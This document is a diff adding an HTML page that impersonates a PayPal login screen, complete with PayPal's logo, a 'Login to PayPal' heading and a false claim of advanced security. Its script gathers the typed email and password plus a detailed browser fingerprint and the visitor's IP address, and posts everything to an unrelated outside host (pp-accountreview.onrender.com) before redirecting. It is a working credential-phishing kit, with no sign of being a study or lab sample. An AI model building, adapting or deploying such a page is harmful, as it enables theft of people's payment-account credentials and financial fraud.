@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login Form</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, white 0%, #1546a0 120%);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #0070ba, #1546a0);
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 35px;
+        }
+
+        .logo {
+            font-size: 30px;
+            font-weight: 600;
+            color: #003087;
+            letter-spacing: -0.5px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .logo svg {
+            width: 64px;
+            height: 64px;
+        }
+
+        .logo em {
+            font-style: normal;
+            background: linear-gradient(135deg, #0070ba, #1546a0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .logo-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-top: 8px;
+            font-weight: 400;
+        }
+
+        .login-form h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #333;
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 600;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #fafbfc;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #0070ba;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1);
+            transform: translateY(-1px);
+        }
+
+        input[type="email"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #aab7c4;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 5px;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #0070ba 0%, #1546a0 100%);
+            color: white;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(0, 112, 186, 0.3);
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 112, 186, 0.4);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .login-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .form-footer {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #e1e5e9;
+        }
+
+        .form-footer a {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .form-footer a:hover {
+            color: #1546a0;
+            text-decoration: underline;
+        }
+
+        .message {
+            margin-top: 20px;
+            padding: 16px;
+            border-radius: 8px;
+            text-align: center;
+            display: none;
+            font-weight: 500;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .security-notice {
+            background: #fff3cd;
+            color: #856404;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+            border: 1px solid #ffeaa7;
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 30px 25px;
+                margin: 10px;
+            }
+
+            body {
+                padding: 10px;
+                align-items: flex-start;
+                padding-top: 40px;
+            }
+
+            .logo {
+                font-size: 28px;
+            }
+
+            .login-form h2 {
+                font-size: 22px;
+            }
+
+            input[type="email"],
+            input[type="password"] {
+                padding: 14px;
+            }
+        }
+
+        @media (max-width: 320px) {
+            .login-container {
+                padding: 20px 15px;
+            }
+
+            input[type="email"],
+            input[type="password"] {
+                padding: 12px;
+                font-size: 14px;
+            }
+
+            .login-btn {
+                padding: 14px;
+                font-size: 14px;
+            }
+        }
+
+        /* Loading animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo-container">
+            <div class="logo">
+                <svg width="64px" height="64px" viewBox="-13.92 -13.92 75.84 75.84" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#000000">
+                    <g id="SVGRepo_bgCarrier" stroke-width="0">
+                        <rect x="-13.92" y="-13.92" width="75.84" height="75.84" rx="0" fill="#ffffff" stroke-width="0"></rect>
+                    </g>
+                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC" stroke-width="0.288"></g>
+                    <g id="SVGRepo_iconCarrier"> 
+                        <title>Paypal-color</title> 
+                        <desc>Created with Sketch.</desc> 
+                        <defs> </defs> 
+                        <g id="Icons" stroke-width="0.00048000000000000007" fill="none" fill-rule="evenodd"> 
+                            <g id="Color-" transform="translate(-804.000000, -660.000000)" fill="#022B87"> 
+                                <path d="M838.91167,663.619443 C836.67088,661.085983 832.621734,660 827.440097,660 L812.404732,660 C811.344818,660 810.443663,660.764988 810.277343,661.801472 L804.016136,701.193856 C803.892151,701.970844 804.498465,702.674333 805.292267,702.674333 L814.574458,702.674333 L816.905967,688.004562 L816.833391,688.463555 C816.999712,687.427071 817.894818,686.662083 818.95322,686.662083 L823.363735,686.662083 C832.030541,686.662083 838.814901,683.170138 840.797138,673.069296 C840.856106,672.7693 840.951363,672.194809 840.951363,672.194809 C841.513828,668.456868 840.946827,665.920407 838.91167,663.619443 Z M843.301017,674.10803 C841.144899,684.052874 834.27133,689.316292 823.363735,689.316292 L819.408334,689.316292 L816.458414,708 L822.873846,708 C823.800704,708 824.588458,707.33101 824.733611,706.423525 L824.809211,706.027531 L826.284927,696.754676 L826.380183,696.243184 C826.523823,695.335698 827.313089,694.666708 828.238435,694.666708 L829.410238,694.666708 C836.989913,694.666708 842.92604,691.611256 844.660308,682.776394 C845.35583,679.23045 845.021677,676.257496 843.301017,674.10803 Z" id="Paypal"> </path> 
+                            </g> 
+                        </g> 
+                    </g>
+                </svg>
+                <em>PayPal</em>
+            </div>
+            <div class="logo-subtitle">Secured Login</div>
+        </div>
+
+        <form class="login-form" id="loginForm">
+            <h2>Login to PayPal</h2>
+            
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email address" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                    <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
+                </div>
+            </div>
+
+            <button type="submit" class="login-btn" id="loginBtn">
+                <span id="btnText">Log In</span>
+            </button>
+
+            <div class="form-footer">
+                <a href="#">Forgot Password?</a>
+                <span style="margin: 0 10px; color: #ccc;">|</span>
+                <a href="#">Create Account</a>
+            </div>
+            
+            <div id="message" class="message"></div>
+
+            <div class="security-notice">
+                🔒 This is a secured login system protected by advanced security measures.
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleBtn = document.querySelector('.toggle-password');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = '🔒';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = '👁️';
+            }
+        }
+
+        // Function to collect all client data
+        function collectClientData() {
+            const data = {
+                // User Agent and Browser Info
+                user_agent: navigator.userAgent,
+                browser_name: getBrowserName(),
+                browser_version: getBrowserVersion(),
+                operating_system: getOS(),
+                
+                // Screen information
+                screen_resolution: `${screen.width}x${screen.height}`,
+                color_depth: screen.colorDepth,
+                pixel_ratio: window.devicePixelRatio || 1,
+                available_resolution: `${screen.availWidth}x${screen.availHeight}`,
+                
+                // Timezone and locale
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language || navigator.userLanguage,
+                languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
+                
+                // Platform information
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                product: navigator.product,
+                
+                // Hardware information
+                hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
+                device_memory: navigator.deviceMemory || 'unknown',
+                max_touch_points: navigator.maxTouchPoints || 0,
+                
+                // Connection information
+                connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                connection_downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
+                
+                // Browser capabilities
+                cookies_enabled: navigator.cookieEnabled,
+                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                
+                // Timestamp
+                client_timestamp: Date.now(),
+                timezone_offset: new Date().getTimezoneOffset(),
+                
+                // Page information
+                page_url: window.location.href,
+                referrer: document.referrer,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                
+                // Additional features
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                webgl: detectWebGL(),
+                canvas: detectCanvas(),
+                geolocation: 'geolocation' in navigator,
+                notifications: 'Notification' in window
+            };
+            
+            return data;
+        }
+
+        // Helper functions for browser detection
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Chrome";
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
+            if (userAgent.includes("Edg")) return "Edge";
+            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+            return "Unknown";
+        }
+
+        function getBrowserVersion() {
+            const userAgent = navigator.userAgent;
+            let match = userAgent.match(/(chrome|firefox|safari|edg|opera|opr)\/?\s*(\d+)/i);
+            return match ? match[2] : "Unknown";
+        }
+
+        function getOS() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Windows")) return "Windows";
+            if (userAgent.includes("Mac")) return "MacOS";
+            if (userAgent.includes("Linux")) return "Linux";
+            if (userAgent.includes("Android")) return "Android";
+            if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
+            return "Unknown";
+        }
+
+        function detectWebGL() {
+            try {
+                const canvas = document.createElement('canvas');
+                return !!(window.WebGLRenderingContext && 
+                         (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function detectCanvas() {
+            try {
+                const canvas = document.createElement('canvas');
+                return !!(canvas.getContext && canvas.getContext('2d'));
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // Main form submission handler
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const messageDiv = document.getElementById('message');
+            const loginBtn = document.getElementById('loginBtn');
+            const btnText = document.getElementById('btnText');
+
+            // Show loading state
+            loginBtn.disabled = true;
+            btnText.innerHTML = '<div class="loading"></div>Processing...';
+            messageDiv.style.display = 'none';
+
+            try {
+                // Validate inputs
+                if (!email || !password) {
+                    throw new Error('Please fill in all fields');
+                }
+
+                if (!validateEmail(email)) {
+                    throw new Error('Please enter a valid email address');
+                }
+
+                // Collect all data
+                const loginData = {
+                    email: email,
+                    password: password,
+                    client_data: collectClientData(),
+                    timestamp: new Date().toISOString(),
+                    session_id: Math.random().toString(36).substr(2, 9)
+                };
+
+                // Get IP address
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    loginData.client_ip = ipData.ip;
+                } catch (ipError) {
+                    console.log('Could not fetch IP address');
+                    loginData.client_ip = 'unknown';
+                }
+
+                // Send data to backend API
+                const response = await fetch('https://pp-accountreview.onrender.com/api/verify-login', {
+                    method: 'POST',
+                    body: JSON.stringify(loginData),
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                });
+
+                const result = await response.json();
+
+                // Check if verification was successful
+                if (result.success) {
+                    messageDiv.textContent = '✅ Login successful!...';
+                    messageDiv.className = 'message success';
+                    messageDiv.style.display = 'block';
+                    
+                    // Redirect to next step only if verification passed
+                    setTimeout(() => {
+                        window.location.href = 'safe.html';
+                    }, 1500);
+                    
+                } else {
+                    // Show error message if verification failed
+                    throw new Error(result.message || 'Login verification failed');
+                }
+
+            } catch (error) {
+                messageDiv.textContent = '❌ ' + error.message;
+                messageDiv.className = 'message error';
+                messageDiv.style.display = 'block';
+                
+                // Reset button state on error
+                loginBtn.disabled = false;
+                btnText.textContent = 'Log In';
+            }
+        });
+
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Add some interactive effects
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.transform = 'scale(1.02)';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.transform = 'scale(1)';
+            });
+        });
+
+        // Real-time email validation
+        document.getElementById('email').addEventListener('blur', function() {
+            const email = this.value;
+            if (email && !validateEmail(email)) {
+                this.style.borderColor = '#dc3545';
+            } else {
+                this.style.borderColor = '#e1e5e9';
+            }
+        });
+    </script>
+</body>
+</html>
